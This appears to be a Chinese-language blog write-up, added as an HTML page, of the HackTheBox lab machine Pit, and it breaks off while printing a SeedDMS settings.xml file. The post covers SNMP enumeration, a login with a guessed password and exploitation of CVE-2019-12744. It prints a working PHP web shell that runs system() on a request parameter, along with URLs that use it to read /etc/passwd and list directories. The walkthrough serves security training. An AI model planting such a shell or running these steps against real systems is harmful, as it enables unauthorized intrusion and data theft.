@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Hackthebox-Pit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Pit">
+<meta property="og:url" content="http://example.com/2022/01/07/HackTheBox-Pit/index.html">
+<meta property="og:site_name" content="Jasontt&#39;s Blog">
+<meta property="og:description" content="Hackthebox-Pit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_nmap.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/80.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/9090.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cockpit.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hosts.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_gobuster.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/udp%E7%AB%AF%E5%8F%A3.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmp%E5%B7%A5%E5%85%B7.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF2.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF1.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/SeedDMS.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/fixinfo.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_upload.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/etcpasswd.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_usertxt.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pit_sudo-l.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF3.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/monitor.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint2.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/createkey.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/publickey.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/checkme.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/writekey.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmpcommand.png">
+<meta property="article:published_time" content="2022-01-07T10:05:12.000Z">
+<meta property="article:modified_time" content="2022-01-07T10:09:16.615Z">
+<meta property="article:author" content="Jason Tu">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png">
+
+
+<link rel="canonical" href="http://example.com/2022/01/07/HackTheBox-Pit/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/01/07/HackTheBox-Pit/","path":"2022/01/07/HackTheBox-Pit/","title":"HackTheBox-Pit"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox-Pit | Jasontt's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Jasontt's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hackthebox-Pit"><span class="nav-number">1.</span> <span class="nav-text">Hackthebox-Pit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">1.5.</span> <span class="nav-text">写在最后</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jason Tu"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">Jason Tu</p>
+  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/07/HackTheBox-Pit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="Jason Tu">
+      <meta itemprop="description" content="一只谦虚的兔子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jasontt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-Pit
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-01-07 18:05:12 / Modified: 18:09:16" itemprop="dateCreated datePublished" datetime="2022-01-07T18:05:12+08:00">2022-01-07</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox-Pit"></a>Hackthebox-Pit</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png" alt="pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.241</p>
+<p>本机IP：10.10.16.12</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要想记录一下对HackTheBox靶机Pit的渗透过程，涉及以下知识点：</p>
+<p>1.snmp和snmpwalk工具使用</p>
+<p>2.CVE-2019-12744</p>
+<p>3.利用本地环境写入authorized_keys文件实现ssh免密登录root</p>
+<p>难度中上，文中如果表述或者操作有问题欢迎各位师傅指出</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_nmap.png" alt="nmap"></p>
+<p>开放了22、80、9090端口，还是从80端口开始看</p>
+<p>访问<code>10.10.10.241:80</code>只是个Nginx服务器搭建成功界面，没有可以利用的点</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/80.png" alt="80"></p>
+<p>再看下9090端口，nmap扫出来一个<code>Zeus-admin?</code>去google一下，没有文章写的很清楚。</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/9090.png" alt="9090"></p>
+<p>查看源码发现了有用信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cockpit.png" alt="cockpit"></p>
+<p>9090端口装了Cockpit</p>
+<blockquote>
+<p>Linux Cockpit 是一个基于Web 界面的应用，它提供了对系统的图形化管理。 … 它是一个用户友好的基于web 的控制台，提供了一些非常简单的方法来管理Linux 系统—— 通过web。 你可以通过一个非常简单的web 来监控系统资源、添加或删除帐户、监控系统使用情况、关闭系统以及执行其他一些其他任务。</p>
+</blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exp库</a>上看看有没有Cockpit的漏洞exp可利用，但是在源码中没有找到关于Cockpit的版本信息 暂时放一放</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hosts.png" alt="hosts"></p>
+<p>还找到了域名<strong>dms-pit.htb</strong>和<strong>pit.htb</strong>  加入到<code>/etc/hosts</code>里方便解析域名</p>
+<p><img src="" alt="etchost"></p>
+<p>尝试用**<a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a>**工具进行目录扫描，没有有用的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://dms-pit.htb/ -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_gobuster.png" alt="Pit_gobuster">做到这里我没思路了，nmap端口扫描的默认协议为TCP，实际上应该扫描一下UDP端口就有思路继续做下去了，还是经验不足吧</p>
+<p>这里卡壳了去看了下官推给的提示</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint.png" alt="hint"></p>
+<p>这个提示我自认为不是很明显，后来找了半天原来是snmpwalk的意思</p>
+<blockquote>
+<p>snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。通过snmpwalk也可以查看支持SNMP协议（可网管）的设备的一些其他信息，比如cisco交换机或路由器IP地址、内存使用率等，也可用来协助开发SNMP功能。</p>
+<p>在日常监控中,经常会用到snmp服务,而snmpwalk命令则是采集系统各种信息最有效的方法。</p>
+</blockquote>
+<p><strong>什么是snmp？</strong></p>
+<blockquote>
+<p> <strong>SNMP</strong>是英文”<strong>Simple Network Management Protocol</strong>“的缩写，中文意思是”<strong>简单网络管理协议</strong>“。<strong>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。由于SNMP协议简单可靠 ，受到了众多厂商的欢迎，成为了目前最为广泛的网管协议。</strong></p>
+<p> SNMP 和 UDP</p>
+<p> SNMP采用UDP协议在管理端和agent之间传输信息。 SNMP采用UDP 161端口接收和发送请求，162端口接收trap，执行SNMP的设备缺省都必须采用这些端口。SNMP消息全部通过UDP端口161接收，只有Trap信息采用UDP端口162。</p>
+</blockquote>
+<p>那接下来我们应该就是通过snmpwalk得到某些信息继续做下去了</p>
+<p>扫描发现161和162端口开放</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/udp%E7%AB%AF%E5%8F%A3.png" alt="udp端口"></p>
+<p>通过<a target="_blank" rel="noopener" href="https://github.com/dheiland-r7/snmp">工具</a>从目标系统中提取SNMP数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpbw.pl target community timeout threads</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmp%E5%B7%A5%E5%85%B7.png" alt="snmp工具"></p>
+<p>得到<code>10.10.10.241.snmp</code>文件，从中发现</p>
+<blockquote>
+<p>Linux版本：Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64</p>
+<p>很多目录</p>
+<p>username：michelle</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF2.png" alt="泄露信息2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF1.png" alt="泄露信息1"></p>
+<p>搜一下seeddms，发现SeedDMS是个文档管理系统</p>
+<p>访问<code>http://dms-pit.htb/seeddms51x/seeddms</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/SeedDMS.png" alt="SeedDMS"></p>
+<p>用<code>michelle</code>这个用户测试登录，简单测试了几个密码发现密码就是用户名，成功登录SeedDMS</p>
+<p>其中发现了一个更新日志，管理员把SeedDMS的版本从5.1.10升级到了5.1.15，CHANGELOG中也显示最后的更新记录升级到了5.1.15版本，去<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exp库</a>看看有无可利用的漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png" alt="changelog"></p>
+<p>可能是官方设计的时候出了问题，整合目前可以得到的所有信息，这台机子的渗透已经做不下去了，如果真和更新日志里写的一样，5.1.15版本没有已知可用的exp。</p>
+<p>看了几篇国外大佬的博客，做到这普遍存在一个疑问就是：日志中明确写到5.1.11版本修复了 CVE-2019-12744，为什么这里CVE-2019-12744的exp还是可以利用? </p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/fixinfo.png" alt="fixinfo"></p>
+<p>没办法，就当5.1.10版本继续做下去</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>用CVE-2019-12744的exp可以实现<strong>远程命令执行</strong></p>
+<p><strong>参链</strong>：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47022">https://www.exploit-db.com/exploits/47022</a></p>
+<p>SeedDMS中进入<strong>michelle</strong>用户目录下添加<code>1.php</code>文档并上传本地的<code>backdoor.php</code>,内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//backdoor.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        system(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_upload.png" alt="upload"></p>
+<p>添加成功以后，看一下<code>1.php</code>的文档id(URL中可一看到document_id=xxx)，接下来可以通过cmd传参执行远程命令了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd= </span><br><span class="line">#我的1.php文档ID是30 </span><br><span class="line">#这里的“data”和“1048576”是保存上传文件的默认文件夹。</span><br></pre></td></tr></table></figure>
+
+<p>查看下<code>/etc/passwd</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/etcpasswd.png" alt="etcpasswd"></p>
+<p>浏览目录文件在<code>/var/www/html/seeddms51x/conf</code>目录下发现了配置文件<code>settings.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=ls /var/www/html/seeddms51x/conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.png" alt="配置信息"></p>
+<p><strong>settings.xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">site</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- siteName: Name of site used in the page titles. Default: SeedDMS</span></span><br><span class="line"><span class="comment">       - foot<span class="doctag">Note:</span> Message to display at the bottom of every page</span></span><br><span class="line"><span class="comment">       - printDisclaimer: if true the disclaimer message the lang.inc files will be print on the bottom of the page</span></span><br><span class="line"><span class="comment">       - language: default language (name of a subfolder in folder &quot;languages&quot;)</span></span><br><span class="line"><span class="comment">       - theme: default style (name of a subfolder in folder &quot;styles&quot;)</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display</span> <span class="attr">siteName</span>=<span class="string">&quot;SeedDMS&quot;</span> <span class="attr">footNote</span>=<span class="string">&quot;SeedDMS free document management system - www.seeddms.org&quot;</span> <span class="attr">printDisclaimer</span>=<span class="string">&quot;true&quot;</span> <span class="attr">language</span>=<span class="string">&quot;en_GB&quot;</span> <span class="attr">theme</span>=<span class="string">&quot;bootstrap&quot;</span> <span class="attr">previewWidthList</span>=<span class="string">&quot;40&quot;</span> <span class="attr">previewWidthDetail</span>=<span class="string">&quot;100&quot;</span> <span class="attr">availablelanguages</span>=<span class="string">&quot;&quot;</span> <span class="attr">showFullPreview</span>=<span class="string">&quot;false&quot;</span> <span class="attr">convertToPdf</span>=<span class="string">&quot;false&quot;</span> <span class="attr">previewWidthMenuList</span>=<span class="string">&quot;40&quot;</span> <span class="attr">previewWidthDropFolderList</span>=<span class="string">&quot;100&quot;</span> 